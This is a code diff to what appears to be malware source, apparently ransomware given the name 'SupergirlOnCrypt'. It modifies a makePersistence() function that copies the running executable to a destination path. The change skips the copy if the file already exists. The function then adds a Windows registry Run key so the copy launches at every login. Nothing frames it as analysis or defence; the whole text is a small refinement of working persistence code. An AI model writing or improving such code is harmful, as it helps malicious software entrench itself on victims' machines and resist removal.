@@ -62,7 +62,8 @@ def makePersistence():
         if sys.platform == "win32":
             dest = dest + ".exe"
             dest = dest.replace('/', '\\')
-        shutil.copyfile(sys.executable, dest)
+        if not os.path.isfile(dest):
+            shutil.copyfile(sys.executable, dest)
         if sys.platform == "win32":
             cmd = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "SupergirlOnCrypt" /t REG_SZ /F /D '
             cmd = cmd + '"' + dest + '"'
